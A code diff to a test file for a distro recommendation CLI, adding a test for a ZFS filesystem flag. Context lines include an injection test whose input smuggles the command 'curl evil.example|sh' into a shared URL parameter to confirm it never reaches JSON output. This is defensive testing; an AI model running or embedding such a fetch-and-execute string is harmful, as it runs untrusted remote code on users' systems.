@@ -24,6 +24,14 @@ test('CLI recommend: --json emits a machine-readable recommendation', () => {
   assert.equal(result.topMatches.length, 5);
 });
 
+test('CLI recommend: accepts low-level systems engineering flags', () => {
+  const { code, stdout } = runCli(['recommend', '--filesystem', 'zfs', '--json']);
+  assert.equal(code, 0);
+  const result = JSON.parse(stdout);
+  const topIds = result.topMatches.map((m: any) => m.distro.id);
+  assert.ok(topIds.includes('truenas-scale') || topIds.includes('proxmox-ve') || topIds.includes('smartos'));
+});
+
 test('CLI recommend: shell payloads in a shared URL never reach the JSON recipe output', () => {
   const url = '?platform=vm&dockerApp=' + encodeURIComponent('x; curl evil.example|sh #');
   const { code, stdout } = runCli(['recommend', '--url', url, '--json']);
